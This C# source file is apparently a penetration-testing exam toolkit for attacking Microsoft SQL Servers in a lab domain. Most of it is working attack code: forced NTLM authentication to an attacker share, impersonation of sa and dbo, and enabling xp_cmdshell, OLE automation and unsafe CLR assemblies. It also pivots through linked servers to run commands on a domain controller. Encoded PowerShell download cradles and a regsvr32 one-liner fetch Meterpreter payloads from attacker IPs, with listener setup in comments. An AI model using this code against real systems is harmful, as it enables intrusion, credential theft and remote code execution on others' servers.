using System;
using System.Data.SqlClient;

namespace MSSQL
{
    public class Program
    {
        public static String executeQuery(String query, SqlConnection con)
        {
            SqlCommand cmd = new SqlCommand(query, con);
            SqlDataReader reader = cmd.ExecuteReader();
            try
            {
                String result = "";
                while (reader.Read() == true)
                {
                    result += reader[0] + " ";
                }
                reader.Close();
                return result;
            }
            catch
            {
                return "";
            }
        }

        public static void getGroupMembership(String groupToCheck, SqlConnection con)
        {
            String res = executeQuery($"SELECT IS_SRVROLEMEMBER('{groupToCheck}');", con);
            int role = int.Parse(res);
            if (role == 1)
            {
                Console.WriteLine($"[+] User is a member of the '{groupToCheck}' group.");
            }
            else
            {
                Console.WriteLine($"[-] User is not a member of the '{groupToCheck}' group.");
            }
        }

        public static void Main(string[] args)
        {
            String serv = "dc01.corp1.com";
            String db = "master";
            String conStr = $"Server = {serv}; Database = {db}; Integrated Security = True;";
            String res = "";
            SqlConnection con = new SqlConnection(conStr);

            try
            {
                con.Open();
                Console.WriteLine("[+] Authenticated to MSSQL Server!");
            }
            catch
            {
                Console.WriteLine("[-] Authentication failed.");
                Environment.Exit(0);
            }

            //// Enumerate login info
            //String login = executeQuery("SELECT SYSTEM_USER;", con);
            //Console.WriteLine($"[*] Logged in as: {login}");
            //String uname = executeQuery("SELECT USER_NAME();", con);
            //Console.WriteLine($"[*] Database username: {uname}");
            //getGroupMembership("public", con);
            //getGroupMembership("sysadmin", con);

            //// Force NTLM authentication for hash-grabbing or relaying
            //// Remember to disable SMB on kali
            //String targetShare = "\\\\192.168.45.206\\vscode";
            //res = executeQuery($"EXEC master..xp_dirtree \"{targetShare}\";", con);
            //Console.WriteLine($"[*] Forced authentication to '{targetShare}'.");

            //// Get logins that we can impersonate
            //res = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ", con);
            //Console.WriteLine($"[*] User can impersonate the following logins: {res}.");

            //// Impersonate login and get login information
            //String su = executeQuery("SELECT SYSTEM_USER;", con);
            //String un = executeQuery("SELECT USER_NAME();", con);
            //Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");
            //res = executeQuery("EXECUTE AS LOGIN = 'sa';", con);
            //Console.WriteLine($"[*] Triggered impersonation.");
            //su = executeQuery("SELECT SYSTEM_USER;", con);
            //un = executeQuery("SELECT USER_NAME();", con);
            //Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");

            //// Impersonate dbo in trusted database and execute through 'xp_cmdshell'
            //// cp OSEP-Code-Snippets/simple_shellcode_runner/simple_shellcode_runner.ps1 run.txt
            //// python3 - m http.server 80
            //// sudo msfconsole -q - x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.45.206; set lport 443; exploit"
            //res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
            //Console.WriteLine("[*] Triggered impersonation.");
            //res = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", con);
            //Console.WriteLine("[*] Enabled 'xp_cmdshell'.");
            //String cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA2AC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA";
            //res = executeQuery($"EXEC xp_cmdshell '{cmd}'", con);
            //Console.WriteLine($"[*] Executed command! Result: {res}");

            //// Impersonate dbo in trusted database and execute through 'sp_OACreate' 
            //// cp OSEP-Code-Snippets/simple_shellcode_runner/simple_shellcode_runner.ps1 run.txt
            //// python3 - m http.server 80
            //// sudo msfconsole -q - x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.45.206; set lport 443; exploit"
            //res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
            //Console.WriteLine("[*] Triggered impersonation.");
            //res = executeQuery("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", con);
            //Console.WriteLine("[*] Enabled OLE automation procedures.");
            //String cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA2AC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA";
            //res = executeQuery($"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{cmd}';", con);
            //Console.WriteLine($"[*] Executed command!");

            //// Loading custom assemblies
            //// Compile mssql_ca.dll from OSEP-Code-Snippets/mssql_custom_assemblies
            //// run pwsh OSEP-Code-Snippets/mssql_custom_assemblies/dll_to_hextring.ps1
            //// copy and paste output into 'CREATE ASSEMBLY myAssembly FROM 0x4D5A90..."
            //res = executeQuery("use msdb;", con);
            //res = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;", con);
            //res = executeQuery("EXEC sp_configure 'clr enabled', 1; RECONFIGURE;", con);
            //res = executeQuery("EXEC sp_configure 'clr strict security', 0; RECONFIGURE;", con);
            //Console.WriteLine("[*] Disabled CLR strict security.");
            //res = executeQuery("DROP PROCEDURE IF EXISTS [dbo].[cmdExec];", con);
            //res = executeQuery("DROP ASSEMBLY IF EXISTS myAssembly;", con);
            //res = executeQuery("CREATE ASSEMBLY myAssembly FROM 0x4D5A9000... WITH PERMISSION_SET = UNSAFE;", con);
            //res = executeQuery("CREATE PROCEDURE[dbo].[cmdExec] @execCommand NVARCHAR(4000) AS EXTERNAL NAME[myAssembly].[StoredProcedures].[cmdExec];", con);
            //res = executeQuery("EXEC cmdExec 'whoami';", con);
            //Console.WriteLine($"[*] Executed command! Result: {res}");

            // Enumerate linked servers
            // Important: replace serv with the right SQL server you want to enumerate from
            serv = "appsrv01.corp1.com";
            db = "master";
            conStr = $"Server = {serv}; Database = {db}; Integrated Security = True;";
            res = "";
            con = new SqlConnection(conStr);
            try
            {
                con.Open();
                Console.WriteLine("[+] Authenticated to MSSQL Server!");
            }
            catch
            {
                Console.WriteLine("[-] Authentication failed.");
                Environment.Exit(0);
            }
            res = executeQuery("EXEC sp_linkedservers;", con);
            Console.WriteLine($"[*] Found linked servers: {res}");
            res = executeQuery("select version from openquery(\"DC01\", 'select @@version as version');", con);
            Console.WriteLine($"[*] Server Version: \n{res}");

            //// Execute on linked server
            //res = executeQuery("EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01;", con);
            //Console.WriteLine($"[*] Enabled advanced options on DC01.");
            //res = executeQuery("EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01;", con);
            //Console.WriteLine($"[*] Enabled xp_cmdshell option on DC01.");
            //res = executeQuery("EXEC ('xp_cmdshell ''whoami'';') AT DC01;", con);
            //Console.WriteLine($"[*] Triggered command. Result: {res}");

            //// Execute on linked server via 'openquery'
            //String res = executeQuery("select 1 from openquery(\"dc01\", 'select 1; EXEC sp_configure ''show advanced options'', 1; reconfigure')", con);
            //Console.WriteLine($"[*] Enabled advanced options on DC01.");
            //res = executeQuery("select 1 from openquery(\"dc01\", 'select 1; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure')", con);
            //Console.WriteLine($"[*] Enabled xp_cmdshell options on DC01.");
            //res = executeQuery("select 1 from openquery(\"dc01\", 'select 1; exec xp_cmdshell ''regsvr32 /s /n /u /i:http://192.168.49.67:8080/F0t6R5A.sct scrobj.dll''')", con);
            //Console.WriteLine($"[*] Triggered Meterpreter oneliner on DC01. Check your listener!");

            // Escalate via double database linked
            res = executeQuery("EXEC('sp_linkedservers') AT DC01;", con);
            Console.WriteLine($"[*] Found linked servers: {res}");
            String su = executeQuery("SELECT SYSTEM_USER;", con);
            Console.WriteLine($"[*] Current system user is '{su}' in database 'appsrv01'.");
            su = executeQuery("select mylogin from openquery(\"dc01\", 'select SYSTEM_USER as mylogin');", con);
            Console.WriteLine($"[*] Current system user is '{su}' in database 'dc01' via 1 link.");
            su = executeQuery("select mylogin from openquery(\"dc01\", 'select mylogin from openquery(\"appsrv01\", ''select SYSTEM_USER as mylogin'')');", con);
            Console.WriteLine($"[*] Current system user is '{su}' in database 'appsrv01' via 2 links.");
            res = executeQuery("EXEC('sp_linkedservers') AT DC01;", con);
            // Execute through 'xp_cmdshell' via double database linked
            res = executeQuery("EXEC('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01;", con);
            res = executeQuery("EXEC('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT appsrv01') AT dc01;", con);
            res = executeQuery("EXEC('EXEC (''xp_cmdshell ''''whoami'''''') AT appsrv01') AT dc01;", con);
            Console.WriteLine($"[*] Executed command! Result: {res}");
        }
    }
}